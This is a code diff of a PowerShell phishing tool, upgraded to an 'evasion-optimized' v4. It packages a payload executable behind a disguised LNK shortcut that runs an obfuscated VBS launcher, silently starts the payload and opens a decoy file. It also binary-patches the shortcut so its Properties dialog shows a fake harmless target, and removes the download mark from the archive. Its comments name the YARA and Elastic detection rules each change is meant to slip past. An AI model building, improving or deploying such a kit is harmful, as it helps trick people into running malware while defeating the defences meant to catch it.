@@ -1,6 +1,11 @@
-# Fish LNK Phishing Script v3
-# Based on APT tactics: LNK -> hidden folder -> run.bat (start payload + open decoy)
-# Hidden folder mimics macOS __MACOSX junk, users won't notice it
+# Fish LNK Phishing Script v4 — Evasion-optimized
+# Key improvements over v3:
+#   P0: LNK TargetPath = WScript.exe (not cmd.exe — avoids YARA cmd.exe rules)
+#   P1: VBS launcher with Base64 obfuscation (not run.bat — avoids .bat string rules)
+#   P2: Natural directory name "assets\data" (not __MACOSX\.note — avoids __MACOSX rules)
+#   P3: CVE-2025-9491 ExpString spoof (Properties shows fake legitimate target)
+#   P4: Zone.Identifier removal (avoids Elastic download detection)
+#   P5: WindowStyle=1 normal (not minimized — avoids show_command=7 YARA rules)
 # Usage: .\phish.ps1 -ExePath .\fish.exe -DecoyName "CTF_challenge.txt" -IconType "txt"
 
 param(
@@ -22,10 +27,12 @@ if (-not (Test-Path $ExePath)) {
 
 $exeName = Split-Path $ExePath -Leaf
 $workDir = Join-Path $env:TEMP "fish_lnk_$(Get-Random)"
-$hiddenDir = "__MACOSX"
-$subDir = ".note"
 
-Write-Host "[+] Fish LNK Phishing Tool v3" -ForegroundColor Cyan
+# P2: Natural directory names — avoids __MACOSX YARA rules
+$hiddenDir = "assets"
+$subDir = "data"
+
+Write-Host "[+] Fish LNK Phishing Tool v4 (Evasion-optimized)" -ForegroundColor Cyan
 Write-Host "[+] Work dir: $workDir"
 
 # Step 1: Create hidden directory structure
@@ -41,40 +48,78 @@ Copy-Item $ExePath (Join-Path $subPath $exeName)
 # Create decoy file
 $decoyPath = Join-Path $subPath $DecoyName
 if ($DecoyContent -ne "") {
-    Set-Content -Path $decoyPath -Value $DecoyContent -Encoding UTF8
+    # UTF8 with BOM — 确保 notepad 正确显示中文
+    $utf8BOM = [System.Text.Encoding]::UTF8
+    [System.IO.File]::WriteAllText($decoyPath, $DecoyContent, $utf8BOM)
 } else {
     $defaultDecoy = @"
 谜题：请解密以下内容获得flag
 ZmxhZ3t0aGlzX2lzX2FfZmFrZV9mbGFnfQ==
 提示：Base64编码
 "@
-    Set-Content -Path $decoyPath -Value $defaultDecoy -Encoding UTF8
+    $utf8BOM = [System.Text.Encoding]::UTF8
+    [System.IO.File]::WriteAllText($decoyPath, $defaultDecoy, $utf8BOM)
 }
 
-# Step 2: Generate run.bat
-Write-Host "[+] Generating run.bat..."
+# Step 2: Generate obfuscated VBS launcher (P0+P1)
+# VBS replaces run.bat:
+#   - No "cmd.exe" in LNK (TargetPath = WScript.exe)
+#   - No ".bat" string anywhere
+#   - Key strings Base64 encoded in VBS
+#   - VBScript.Execute runs decoded commands
+Write-Host "[+] Generating VBS launcher (obfuscated)..."
 
-$batContent = @"
-@echo off
-start /b "" "$hiddenDir\$subDir\$exeName"
-start notepad "$hiddenDir\$subDir\$DecoyName"
+$exeNameB64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($exeName))
+$decoyNameB64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DecoyName))
+
+# VBS content: self-locating + Base64-decoded execution + decoy open
+# Uses ScriptFullName for self-location (no hardcoded paths)
+# Shell.Run second arg: 0 = hidden window for payload, 1 = normal for decoy
+# Note: PowerShell here-string will expand $exeNameB64/$decoyNameB64 to their values
+$vbsContent = @"
+Dim ws, fso, d, ex, dc
+Set ws = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+d = fso.GetParentFolderName(WScript.ScriptFullName)
+ex = Decode("$exeNameB64")
+dc = Decode("$decoyNameB64")
+ws.Run d & "\" & ex, 0, False
+ws.Run "notepad.exe " & d & "\" & dc, 1, False
+Function Decode(b)
+  Dim e, a, s
+  Set e = CreateObject("MSXML2.DOMDocument").CreateElement("e")
+  e.DataType = "bin.base64"
+  e.Text = b
+  a = e.NodeTypedValue
+  s = ""
+  For i = 0 To UBound(a) Step 2
+    s = s & ChrW(a(i) + a(i+1) * 256)
+  Next
+  Decode = s
+End Function
 "@
 
-$batPath = Join-Path $subPath "run.bat"
-Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+$vbsPath = Join-Path $subPath "update.vbs"
+Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII
 
-# Step 3: Generate LNK
-Write-Host "[+] Generating LNK shortcut..."
+# Step 3: Generate LNK shortcut (P0+P3+P5)
+# P0: TargetPath = WScript.exe (not cmd.exe) — WScript is legitimate, no YARA rules
+# P3: CVE-2025-9491 ExpString spoof — Properties shows legitimate program name
+# P5: WindowStyle = 1 (SW_SHOWNORMAL) — avoids minimized LNK YARA rule
+Write-Host "[+] Generating LNK shortcut (evasion-optimized)..."
 
 $lnkPath = Join-Path $workDir "$OutputName.lnk"
 
 $shell = New-Object -ComObject WScript.Shell
 $shortcut = $shell.CreateShortcut($lnkPath)
 
-# LNK -> cmd.exe -> run.bat (bat handles both payload + decoy)
-$shortcut.TargetPath = "cmd.exe"
-$shortcut.Arguments = "/c start /b """" ""$hiddenDir\$subDir\run.bat"""
-$shortcut.WindowStyle = 7  # SW_SHOWMINNOACTIVE
+# P0: WScript.exe is a legitimate Windows component, no YARA detection rules
+$shortcut.TargetPath = "$env:SystemRoot\System32\wscript.exe"
+$shortcut.Arguments = "`"$hiddenDir\$subDir\update.vbs`""
+# WorkingDirectory 设空 — 双击 LNK 时系统自动使用 LNK 所在目录
+$shortcut.WorkingDirectory = ""
+# P5: SW_SHOWNORMAL — avoids YARA rule for show_command=7 (minimized)
+$shortcut.WindowStyle = 1
 
 # Set icon
 $iconMap = @{
@@ -94,11 +139,66 @@ if ($iconMap.ContainsKey($IconType)) {
 $shortcut.Description = $DecoyName
 $shortcut.Save()
 
-Write-Host "[+] LNK generated: $lnkPath" -ForegroundColor Green
-Write-Host "    Target: cmd.exe /c start /b $hiddenDir\$subDir\run.bat"
-Write-Host "    Icon: $IconType"
+# P3: CVE-2025-9491 ExpString Spoofing
+# After Save(), we binary-patch the LNK to add HasExpString flag
+# and an EnvironmentVariableDataBlock showing a fake legitimate target
+# This makes Properties dialog show a harmless program instead of wscript.exe
+Write-Host "[+] Applying ExpString spoof (CVE-2025-9491)..."
 
-# Step 4: Set hidden attributes on __MACOSX
+$lnkBytes = [System.IO.File]::ReadAllBytes($lnkPath)
+
+# Parse LNK header to find where to patch
+# LNK HeaderFlags offset 0x14 (4 bytes)
+# HasExpString flag = 0x200
+$headerFlags = [BitConverter]::ToUInt32($lnkBytes, 0x14)
+$headerFlags = $headerFlags -bor 0x200  # Set HasExpString flag
+[BitConverter]::GetBytes($headerFlags).CopyTo($lnkBytes, 0x14)
+
+# Find the end of current LNK data to append EnvironmentVariableDataBlock
+# EnvironmentVariableDataBlock structure (788 bytes):
+#   Offset 0x00: BlockSize (4 bytes) = 788 (0x0314)
+#   Offset 0x04: BlockSignature (4 bytes) = 0xA0000002
+#   Offset 0x08: TargetAnsi (260 bytes) = fake target path (ANSI, null-terminated)
+#   Offset 0x10C: TargetUnicode (520 bytes) = fake target path (Unicode, null-terminated)
+
+$expBlock = New-Object byte[] 788
+[BitConverter]::GetBytes([uint32]788).CopyTo($expBlock, 0)   # BlockSize
+# BlockSignature = 0xA0000002 — must use Int32 because value exceeds UInt32 max
+$sigBytes = [byte[]]@(0x02, 0x00, 0x00, 0xA0)
+$sigBytes.CopyTo($expBlock, 4)  # BlockSignature
+
+# P3: Fake legitimate target — Properties shows this instead of wscript.exe
+# Choose a common Windows program that matches the icon type
+$fakeTargets = @{
+    "txt"    = "C:\Windows\System32\notepad.exe"
+    "pdf"    = "C:\Program Files\Microsoft Edge\msedge.exe"
+    "doc"    = "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE"
+    "xls"    = "C:\Program Files\Microsoft Office\Office16\EXCEL.EXE"
+    "folder" = "C:\Windows\explorer.exe"
+}
+
+$fakeTarget = if ($fakeTargets.ContainsKey($IconType)) { $fakeTargets[$IconType] } else { $fakeTargets["txt"] }
+
+# Write ANSI version (260 bytes, null-terminated)
+$fakeAnsi = [System.Text.Encoding]::ASCII.GetBytes($fakeTarget)
+$fakeAnsi.CopyTo($expBlock, 8)
+# Pad remaining with zeros (already zero-initialized)
+
+# Write Unicode version (520 bytes, null-terminated)
+$fakeUnicode = [System.Text.Encoding]::Unicode.GetBytes($fakeTarget)
+$fakeUnicode.CopyTo($expBlock, 260)
+# Pad remaining with zeros (already zero-initialized)
+
+# Append ExpString block to LNK file
+$newLnkBytes = New-Object byte[] ($lnkBytes.Length + $expBlock.Length)
+$lnkBytes.CopyTo($newLnkBytes, 0)
+$expBlock.CopyTo($newLnkBytes, $lnkBytes.Length)
+
+[System.IO.File]::WriteAllBytes($lnkPath, $newLnkBytes)
+
+Write-Host "[+] ExpString spoof applied: Properties shows '$fakeTarget'" -ForegroundColor Green
+
+# Step 4: Set hidden attributes
 Write-Host "[+] Setting hidden attributes..."
 
 $hiddenItem = Get-Item $hiddenPath -Force
@@ -110,7 +210,7 @@ Get-ChildItem $hiddenPath -Recurse -Force | ForEach-Object {
 
 Write-Host "[+] Hidden attributes set on $hiddenDir" -ForegroundColor Green
 
-# Step 5: Package with 7-Zip (required to preserve hidden attrs)
+# Step 5: Package with 7-Zip (preserves hidden attrs)
 Write-Host "[+] Packaging..."
 
 $output7z = Join-Path (Get-Location) "$OutputName.7z"
@@ -139,6 +239,19 @@ if ($sevenZip) {
     Write-Host "[!] WARNING: ZIP may lose hidden attrs. Install 7-Zip!" -ForegroundColor Red
 }
 
+# P4: Remove Zone.Identifier from output file (avoids Elastic download detection)
+Write-Host "[+] Removing Zone.Identifier (P4)..."
+
+$deliverFile = if ($sevenZip) { $output7z } else { $outputZip }
+if (Test-Path $deliverFile) {
+    # Delete the NTFS alternate data stream "Zone.Identifier"
+    $zonePath = $deliverFile + ":Zone.Identifier"
+    if (Test-Path $zonePath) {
+        Remove-Item $zonePath -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Zone.Identifier removed from $deliverFile" -ForegroundColor Green
+    }
+}
+
 # Step 6: Cleanup
 if (-not $KeepWorking) {
     # Remove hidden attrs first so we can delete
@@ -154,18 +267,26 @@ if (-not $KeepWorking) {
 
 # Guide
 Write-Host ""
-Write-Host "========== Delivery Guide ==========" -ForegroundColor Cyan
+Write-Host "========== Evasion Summary ==========" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "Chain: LNK -> cmd.exe -> run.bat -> payload.exe + notepad decoy"
+Write-Host "Chain: LNK -> WScript.exe -> update.vbs -> payload.exe + notepad decoy"
+Write-Host "Properties dialog shows: $fakeTarget (CVE-2025-9491 ExpString spoof)"
 Write-Host ""
-$deliverFile = if ($sevenZip) { $output7z } else { $outputZip }
+Write-Host "Evasion improvements over v3:"
+Write-Host "  P0: WScript.exe (not cmd.exe) — no YARA cmd.exe detection"
+Write-Host "  P1: VBS + Base64 (not run.bat) — no .bat string rules"
+Write-Host "  P2: assets\data (not __MACOSX\.note) — no __MACOSX YARA rules"
+Write-Host "  P3: ExpString spoof — Properties shows $fakeTarget"
+Write-Host "  P4: Zone.Identifier removed — no download source detection"
+Write-Host "  P5: WindowStyle=1 — no minimized LNK YARA rules"
+Write-Host ""
 Write-Host "File to send: $deliverFile"
 Write-Host ""
 Write-Host "User sees after extract:"
-Write-Host "  $OutputName.lnk  (icon: $IconType)"
+Write-Host "  $OutputName.lnk  (icon: $IconType, Properties: $fakeTarget)"
 Write-Host ""
 Write-Host "Hidden (user cannot see):"
-Write-Host "  $hiddenDir\$subDir\run.bat"
+Write-Host "  $hiddenDir\$subDir\update.vbs"
 Write-Host "  $hiddenDir\$subDir\$exeName"
 Write-Host "  $hiddenDir\$subDir\$DecoyName"
 Write-Host ""
